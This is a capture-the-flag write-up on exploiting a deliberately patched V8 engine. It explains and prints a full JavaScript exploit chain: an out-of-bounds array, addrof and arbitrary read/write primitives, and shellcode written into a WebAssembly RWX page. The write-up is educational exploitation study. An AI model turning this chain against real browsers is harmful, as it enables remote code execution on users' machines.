<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>Download Horsepower</h1>
            <h2>June 2021</h2>           
            <h4>V8 - JSArray Length Field Corruption</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
         Gotta go fast. <a href=../../docs/browser/download_horsepower/server.py>server.py  </a><a href=../../docs/browser/download_horsepower/patch.txt>patch.txt</a><br>
         We are given the server.py python script, a d8 executeable and source code with a custom patch. I included the files directly relevant to the writeup above. 
    	<br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	Looking at the provided patch, a very obvious vulnerability was introduced into v8. The patch adds a function called setHorsepower that allows us to set the length field of JSArray objects to a value of our chosing. The screenshot below showcases the relevant parts of the patch.
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/browser/download_horsepower/pic_1.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        With this added vulnerability we can get an out of bounds read and write as showcased below. We start off by creating a JSArray object of type FixedDoubleArray. Next we use the setHorsepower function to increase its length to 0x100. We can now access out of bounds memory and both read and overwrite values stored on the v8-heap. We will now proceed to leverage this bug to take control of v8 and gain arbitrary code execution. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/browser/download_horsepower/pic_2.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        As you can see in the above screenshot, accessing arr[50] returned a float number due to the type of our array. Float numbers such as these are hard to interpret and use especially since they are oftentimes actually addresses that we would much rather view in hex. To accomplish this we will start by adding 2 helper functions.
        <br><br>
    </p>
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}

function itof(val) { 
    u32_buf[0] = Number(val & 0xffffffffn);
    u32_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
        </code>
    </pre>
</div>
<div class="paragraph">
    <p>
        <br><br>
        The first helper function, ftoi, takes a value of type float and converts it to a BigInt value. The second helper function, itof, accepts a BigInt value as its argument and converts it to a float. This function will be important when trying to write values into memory.
        <br><br>
        Now that that is setup, our first goal will be to craft an addrof primitive. This primitive should allow us to pass in an arbitrary object and the function should return its address. We will accomplish this using our vulnerability.
        <br><br>
    </p>
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
var s = [1.1,2.2];
var obj = {"A":1};
var obj_arr = [obj];
var fl_arr = [3.3,4.4];
var tmp = new Uint8Array(8);
s.setHorsepower(0x100);

let obj_arr_elem = s[12];

function addrof(obj) {
    obj_arr[0] = obj;
    s[17] = obj_arr_elem;
    return ftoi(fl_arr[0]) & 0xffffffffn;
}
        </code>
    </pre>
</div>
<div class="paragraph">
    <p>
        <br><br>
        We start by creating some objects, and using the vulnerable function to extend the length of our float array s. By accessing various indexes of the s array we can now read and overwrite arbitrary values stored after the s array. Our first step is to retrieve the elements pointer of our obj_arr. This will become vital for the upcoming addrof primitive.
        <br><br>
        For the addrof function, we start by setting the first index of our obj_arr to the value address we are trying to leak. Next we use our vulnerability to overwrite the elements pointer of fl_arr with the elements pointer of our object array. This makes it so fl_arr[0] now points to the address we just stored in the obj_arr. Finally we use ftoi to return the value with type BigInt. Like this we successfuly managed to create a primitive that allows us to retrieve the addresses of our objects. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/browser/download_horsepower/pic_3.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        As you may have spotted in the above screenshot, we did not in fact leak the entire address of the passed in object. We only got the lower 4 bytes. This is due to a v8 concept called pointer compression. To save space, only the lower 4 bytes of addresses are stored on the v8 heap. Since the upper 4 bytes are always the same throughout a specific v8 process, this address is instead stored in the r13 register. We will need to find a way to leak this value too if we want to successfuly leak object addresses. 
        <br><br>
        In the beginning of our exploit we executed 'var tmp = new Uint8Array(8);' to allocate a specific object. As it turns out, this object actually stores the root address in memory, so we can simply leak it by accessing s[32];
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/browser/download_horsepower/pic_4.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        We now have everything needed to proceed with our next primitives. To be more specific, we want an arbitrary read and write. There are multiple ways to achieve this, but I decided to accomplish this primitive via a pair of ArrayBuffers. 
        <br><br>
    </p>
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
function arb_read(obj,offset) {
    dv_1.setUint32(0, Number(addrof(obj)-1n+offset), true);
    return dv_2.getUint32(0, true);
}

function arb_write(addr,val) {
    w[21] = itof(BigInt(part_2)>>32n);
    dv_1.setUint32(0, Number(addr), true);   
    dv_2.setUint32(0, val, true);
}

var w = [1.1,2.2];
w.setHorsepower(0x100);
var arr_1 = new ArrayBuffer(0x40);
var dv_1 = new DataView(arr_1);
var arr_2 = new ArrayBuffer(0x40);
var dv_2 = new DataView(arr_2);

w[6] = itof((addrof(arr_2)+0x10n + 3n)<<32n);
w[7] = itof(BigInt(root_leak)>>32n);
w[21] = itof(BigInt(root_leak)>>32n);
        </code>
    </pre>
</div>
<div class="paragraph">
    <p>
        <br><br>
        Once again we start by allocating an arr w and extend its length using the vulnerable function to achieve an index read/write. Next we allocate 2 arraybuffers and their dataview objects. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/browser/download_horsepower/pic_5.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        In JSArrayBuffer objects, the backing store points to their elements. These elements can then be viewed and edited using the getUint32() and setUint32() functions. This means that if we overwrite the backing store pointer of arr_1 with the address of the backing store pointer of arr_2, we can execute 'dv_1.setUint32(addrof(obj));' to write an arbitrary address to the backing store pointer of arr_2. We can now use dv_2.(get/set) to complete our arbitrary read and write primitives by using the pointer received from arr_1.
        <br><br>
        We now have all of our primitives together. The last thing needed is a way to obtain code execution. With our primitives, the easiest way to achieve this is through shellcode and webassembly.
        <br><br>
    </p>
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
let pwn = wasm_instance.exports.main;
        </code>
    </pre>
</div>
<div class="paragraph">
    <p>
        <br><br>
        When creating a wasm function as demonstrated above, a RWX page is created in memory. This address is then stored at wasm_instance + 0x68. 
        <br><br>
        To complete our exploit, we start by leaking the address of the rwx page using our arb_read() function on wasm_instance + 0x68. Next we call copy_shellcode() to copy our shellcode over to this page step by step using arb_write(). Finally we execute the '/bin/cat ./flag.txt' shellcode to retrieve the flag and complete the challenge.  
        <br><br>
        The full exploit script is posted below.
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/browser/download_horsepower/pic_6.png" alt="">
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
var flagcode =[0x52d23148,0x622fba49,0x632f6e69,0x52417461,0x52e78948,0x6c66ba49,0x742e6761,0x52417478,0x52e38948,0x89485753,0x993bb0e6,0x050f];

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,
128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,
0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,
128,0,1,132,128,128,128,0,0,65,42,11]);

let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
let pwn = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}

function itof(val) { 
    u32_buf[0] = Number(val & 0xffffffffn);
    u32_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var s = [1.1,2.2];
var obj = {"A":1};
var obj_arr = [obj];
var fl_arr = [3.3,4.4];
var tmp = new Uint8Array(8);
s.setHorsepower(0x100);

function addrof(obj) {
    obj_arr[0] = obj;
    s[17] = obj_arr_elem;
    return ftoi(fl_arr[0]) & 0xffffffffn;
}

function arb_read(obj,offset) {
    dv_1.setUint32(0, Number(addrof(obj)-1n+offset), true);
    return dv_2.getUint32(0, true);
}

function arb_write(addr,val) {
    w[21] = itof(BigInt(part_2)>>32n);
    dv_1.setUint32(0, Number(addr), true);   
    dv_2.setUint32(0, val, true);
}

function copy_shellcode(code) {
    for (let i = 0; i < code.length; i++) {
            arb_write(part_1 + BigInt(i*4),code[i]);
    }
}

let root_leak = Number(ftoi(s[32]) >> 3n << 3n);
let fl_arr_map = Number(Number(ftoi(s[16]) & 0xffffffffn));
let obj_arr_map = Number(Number(ftoi(s[11]) & 0xffffffffn));

let obj_arr_elem = s[12];

console.log("[+] Isolate Root Leak: 0x" + root_leak.toString(16));
console.log("[+] Float Array Map: 0x" + (fl_arr_map + root_leak).toString(16));
console.log("[+] Object Array Map: 0x" + (fl_arr_map + root_leak).toString(16));
console.log("[+] Wasm Instance Elements: 0x" + (addrof(wasm_instance)+BigInt(root_leak)).toString(16));

var w = [1.1,2.2];
w.setHorsepower(0x100);
var arr_1 = new ArrayBuffer(0x40);
var dv_1 = new DataView(arr_1);
var arr_2 = new ArrayBuffer(0x40);
var dv_2 = new DataView(arr_2);

w[6] = itof((addrof(arr_2)+0x10n + 3n)<<32n);
w[7] = itof(BigInt(root_leak)>>32n);
w[21] = itof(BigInt(root_leak)>>32n);

part_1 = BigInt(arb_read(wasm_instance,0x68n));
part_2 = BigInt(arb_read(wasm_instance,0x68n+0x4n)) << 32n;
var rwx_page_addr = part_1 + part_2;

console.log("[+] RWX Page: 0x" + rwx_page_addr.toString(16));

copy_shellcode(flagcode);

console.log("[+] Executing Shellcode.....");

pwn();
        </code>
    </pre>
</div>

<br><br>

<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
